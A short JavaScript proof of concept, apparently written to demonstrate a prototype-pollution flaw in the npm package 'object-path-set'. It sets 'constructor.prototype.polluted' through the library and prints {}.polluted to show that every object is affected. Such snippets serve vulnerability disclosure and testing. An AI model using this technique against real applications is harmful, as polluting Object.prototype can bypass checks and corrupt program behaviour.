var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const setPath = require('object-path-set');
console.log({}.polluted);
setPath(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);